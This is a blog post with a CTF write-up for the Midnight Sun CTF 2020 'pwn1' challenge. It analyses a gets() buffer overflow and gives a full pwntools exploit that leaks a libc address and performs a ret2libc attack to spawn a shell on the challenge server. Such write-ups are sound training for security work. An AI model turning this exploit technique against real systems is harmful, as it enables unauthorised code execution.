---
layout: post
title: Midnight Sun CTF 2020 Quals - pwn1 
---

> An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, 
for GNU/Linux 3.2.0, BuildID[sha1]=c6454068347641785d5aff4a7402fec917f9485d, stripped

Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Decompiling challenge in IDA very quickly reveals vulnerability. Function `gets` is used to read data from user directly the buffer `v4` which obviously leads to buffer overflow vulnerability.

![code decompiled][decompiled]

Pushing `rbp` and subtracting from the stack 0x40 for local variables.

![code disassembly][disassembly]

In order to overwrite the return address it is required to send `0x40 (64) + 0x8 (rbp) + "AAAAAAAA"`. This will result in overwriting RIP with `"AAAAAAAA"`.

Our strategy for exploiting binary will be following:
1. Leak libc address by using `puts` and return back to main to send another payload.
2. Send payload to perform ret2libc attack.

Lets leak libc printf address and do the calculations.

{% highlight python %}
pop_rdi = 0x400783 # : pop rdi ; ret
main = 0x400698

# leak libc
payload = (
    b"A" * 72 +
    p64(pop_rdi) +
    p64(exe.got["printf"]) +
    p64(exe.plt["puts"]) +
    p64(main)

)
io.sendline(payload)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.printf

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
{% endhighlight %}

Sending payload to perform ret2libc attack.

{% highlight python %}
payload = (
    b"A" * 72 +
    p64(ret) +
    p64(pop_rdi) +
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

This results in getting interactive shell.

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./pwn1')
libc = ELF("./libc.so")

host = args.HOST or 'pwn1-01.play.midnightsunctf.se'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc.so"})
io.recvuntil("buffer: ")

pop_rdi = 0x400783 # : pop rdi ; ret
ret = 0x400784 # : ret
main = 0x400698

# leak libc
payload = (
    b"A" * 72 +
    p64(pop_rdi) +
    p64(exe.got["printf"]) +
    p64(exe.plt["puts"]) +
    p64(main)

)
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.printf

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("buffer: ")
payload = (
    b"A" * 72 +
    p64(ret) +
    p64(pop_rdi) +
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/midnightsun/pwn1
[decompiled]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn1/decompiled.png
[disassembly]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn1/disassembly.png

